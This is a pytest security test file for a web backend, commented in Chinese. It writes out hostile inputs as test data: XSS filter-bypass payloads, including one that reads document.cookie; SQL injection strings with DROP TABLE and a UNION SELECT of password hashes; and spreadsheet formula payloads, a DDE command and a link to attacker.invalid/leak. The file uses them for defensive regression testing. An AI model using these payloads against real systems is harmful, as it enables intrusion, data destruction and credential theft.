"""XSS 防護與輸入處理。"""
import io

import pytest
import requests
from conftest import BACKEND, known_vuln
from helpers import find_result, wait_for

pytestmark = pytest.mark.security

# schemas.py:10 的黑名單只有這四個：<script>、javascript:、onload=、onerror=
BYPASSES = [
    '<script >alert(1)</script>',        # 標籤加空格
    '<script\n>alert(1)</script>',       # 標籤加換行
    '<img src=x onmouseover=alert(1)>',  # 不在黑名單的事件
    '<svg onfocus=alert(1) autofocus>',  # 同上
    '<body onpointerdown=alert(1)>',     # 同上
    '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">',
    '<details ontoggle=alert(1) open>',
    '<input onfocusin=alert(1) autofocus>',
    'java\tscript:alert(1)',             # 關鍵字中間插控制字元
    '<a href="javascript&colon;alert(1)">x</a>',
]


@known_vuln("SEC-09")
@pytest.mark.parametrize("payload", BYPASSES, ids=range(len(BYPASSES)))
def test_payload_stored_and_returned_unchanged(admin, unique_url, payload):
    """
    正確的性質不是「擋掉這些 payload」——黑名單永遠列不完，那是死路。
    正確的性質是「資料原封不動來回」：輸入端不改動使用者的資料，
    跳脫交給輸出端（React 插值預設就會跳脫）。

    存進去被改動過，代表防護做錯層了：既擋不住攻擊，又把正常資料弄壞
    （SEC-14 那個含 & 的帳號登不進去就是這樣來的）。
    """
    u = f"{unique_url}/{abs(hash(payload)) % 9999}"
    r = admin.post("/api/whitelist/", json={
        "url": u, "title": payload, "reason": "XSS 往返測試"})
    assert r.status_code == 200, f"合法輸入被擋掉了：{r.status_code} {r.text[:200]}"

    try:
        rows = [w for w in admin.get("/api/whitelist/").json() if w["url"] == u]
        assert rows, "存進去卻讀不回來"
        assert rows[0]["title"] == payload, (
            f"資料在存取過程中被改動了：\n  送出 {payload!r}\n  取回 {rows[0]['title']!r}"
        )
    finally:
        for w in admin.get("/api/whitelist/").json():
            if w["reason"] == "XSS 往返測試":
                admin.delete(f"/api/whitelist/{w['id']}")


@known_vuln("SEC-09")
def test_json_responses_are_not_html(admin):
    """
    後端回應必須是 application/json。只要不是 HTML，
    夾在資料裡的 <script> 就不會被瀏覽器當標記解析——這才是後端該保證的事。
    """
    r = admin.get("/api/whitelist/")
    ctype = r.headers.get("content-type", "")
    assert ctype.startswith("application/json"), f"回應的 content-type 是 {ctype!r}"


@known_vuln("SEC-01")
def test_anyone_cannot_inject_content_into_admin_report(anon, unique_url):
    """
    儲存型 XSS 的前提條件是「攻擊者寫得進去」。

    後端不再對輸入做跳脫（那是錯的層，見上面兩個測試），輸出端由 React 負責，
    所以真正的破口不是「有沒有過濾」，而是 crawler 端點根本不需要驗證——
    任何人都能把任意內容寫進管理員會看到的報表。這是 SEC-01 的問題，
    修好 SEC-01 這條路徑就一起封掉了。
    """
    payload = '<img src=x onmouseover="alert(document.cookie)">'
    r = anon.post("/api/crawler/report/", auth=False, json={
        "task_type": "x", "url": unique_url,
        "text_content": payload, "keywords": [payload],
        "product_images_b64": []})
    assert r.status_code in (401, 403), (
        f"任何人都能把內容寫進管理員的報表（HTTP {r.status_code}）"
    )


@known_vuln("SEC-14")
def test_account_with_special_chars_can_login(admin):
    """
    UserLogin.account 在查資料庫前被 html.escape()，但 UserCreate 建立時不跳脫。
    帳號 a&b 存進去是 a&b，登入時卻拿 a&amp;b 去比對，永遠對不上。
    這是資料正確性問題，根因是把 XSS 防護放錯層。
    """
    import uuid
    account = f"a&b_{uuid.uuid4().hex[:6]}"
    password = "Test1234!@#$"
    r = admin.post("/api/users/", json={
        "account": account, "password": password,
        "role": "一般人員", "department": "測試"})
    assert r.status_code == 200, f"建立帳號就失敗了：{r.text[:200]}"

    login = requests.post(f"{BACKEND}/api/login/",
                          json={"account": account, "password": password}, timeout=30)

    users = {u["account"]: u["id"] for u in admin.get("/api/users/").json()}
    if account in users:
        admin.delete(f"/api/users/{users[account]}")

    assert login.status_code == 200, (
        f"帳號 {account!r} 建得起來卻登不進去——存入不跳脫、查詢卻跳脫"
    )


def test_sql_injection_in_login(anon):
    """ORM 有綁參數，SQLi 本來就不該成立。這條應該直接通過。"""
    for payload in ["' OR '1'='1", "admin'--", "'; DROP TABLE users;--"]:
        r = anon.post("/api/login/", auth=False,
                      json={"account": payload, "password": payload})
        assert r.status_code in (401, 422), f"SQLi payload 有反應：{payload!r}"


def test_sql_injection_does_not_drop_tables(anon, db):
    anon.post("/api/login/", auth=False,
              json={"account": "x'; DROP TABLE users;--", "password": "x"})
    with db.cursor() as c:
        c.execute("SHOW TABLES LIKE 'users'")
        assert c.fetchone(), "users 資料表不見了"


def test_search_is_not_sql_injectable(admin):
    """
    黑白名單與 AI 清單的搜尋不能被 SQL injection。

    q 是使用者輸入、直接進 LIKE 條件的，是最典型的注入點。
    這裡不是驗「有沒有回結果」，是驗資料表還在、而且沒有回出不該回的東西。
    """
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE blacklist_websites; --",
        "1 UNION SELECT password_hash FROM users--",
        "\\' OR 1=1#",
        "') OR ('a'='a",
    ]
    for endpoint in ("/api/blacklist/", "/api/whitelist/"):
        for payload in payloads:
            r = admin.get(endpoint, params={"q": payload})
            assert r.status_code == 200, f"{endpoint} q={payload!r} → {r.status_code}"
            body = r.text
            assert "$2b$" not in body, f"{endpoint} 回應裡出現密碼雜湊：{payload!r}"

    # 表還在（注入成功的話 DROP TABLE 會讓這裡 500）
    assert admin.get("/api/blacklist/").status_code == 200
    assert admin.get("/api/whitelist/").status_code == 200


def test_search_escapes_like_wildcards(admin):
    """
    搜尋要跳脫 LIKE 的 % 與 _。

    不跳脫的話 q=% 會匹配所有資料——實測修之前在 6695 筆的表上，
    q=% 回傳全部 6695 筆、q=_ 也是。那不只是搜尋結果不對，
    使用者想找字面上的 % 或 _ 時永遠找不到。
    """
    all_count = admin.get("/api/crawler/automated_24h_list/",
                          params={"limit": 1}).json()["total_count"]
    if all_count < 2:
        pytest.skip("資料太少，看不出萬用字元有沒有生效")

    for wildcard in ("%", "_"):
        got = admin.get("/api/crawler/automated_24h_list/",
                        params={"q": wildcard, "limit": 1}).json()["total_count"]
        assert got < all_count, (
            f"q={wildcard!r} 回傳 {got} 筆／共 {all_count} 筆——"
            f"萬用字元沒有跳脫，被當成「匹配任何字元」了"
        )


# ============================================================
# SEC-23　匯出的 Excel 不能包含公式
# ============================================================
# 跟上面的 XSS 是同一課：防護要在輸出端。差別只在輸出端從瀏覽器換成 Excel。
FORMULA_URLS = [
    "=cmd|'/c calc'!A1",                                    # DDE，開檔即執行
    '=HYPERLINK("http://attacker.invalid/leak","風險報表")',   # 誘導點擊外連
]


@known_vuln("SEC-23")
def test_export_does_not_produce_formula_cells(admin, internal):
    """
    匯出的 xlsx 裡不能有任何公式儲存格，而且值要跟資料庫裡的一模一樣。

    xlsx 不是 CSV：openpyxl 只有對 "=" 開頭的字串會推斷成公式
    （實測 @ + - 開頭都寫成文字），但推斷出來的是真的 <f> 元素，
    Excel 開檔時會執行。

    這裡刻意用 internal 打回報端點——那三支只驗長度不驗 scheme，是 "=" 開頭
    的值唯一進得了 ai_analysis_results.url 的路徑。用 admin 的 /api/scan_target/
    會停在 422（FrontendScanRequest 有擋 scheme），看起來過了其實什麼都沒驗到。
    """
    from openpyxl import load_workbook

    for url in FORMULA_URLS:
        r = internal.post("/api/nlp/report/", json={
            "url": url, "risk_score": 1, "nlp_keywords": []})
        # 這一步失敗的話，下面「找不到公式」會變成假通過，所以要先擋住
        assert r.status_code == 200, (
            f"測試資料沒進去，後面的斷言就沒有意義了：{r.status_code} {r.text[:200]}"
        )

    r = admin.get("/api/export/ai_results_excel/")
    assert r.status_code == 200, f"匯出失敗：{r.status_code} {r.text[:200]}"

    ws = load_workbook(io.BytesIO(r.content))["AI分析總表"]
    cells = [c for row in ws.iter_rows() for c in row]

    # 先確認 payload 真的在檔案裡。少了這一步，只要匯出剛好沒撈到這幾筆，
    # 這個測試就會在漏洞還在的情況下顯示通過。
    values = {c.value for c in cells}
    missing = [u for u in FORMULA_URLS if u not in values]
    assert not missing, (
        f"這些網址沒有出現在匯出檔裡，無法驗證：{missing}\n"
        f"　　值被改動過也會落到這裡——修法不該動到欄位內容（那是蒐證資料）。"
    )

    formulas = [(c.coordinate, c.value) for c in cells if c.data_type in ("f", "e")]
    assert not formulas, (
        f"匯出的 Excel 裡有 {len(formulas)} 個公式／錯誤碼儲存格，"
        f"承辦人員開檔時會被執行：{formulas[:3]}"
    )
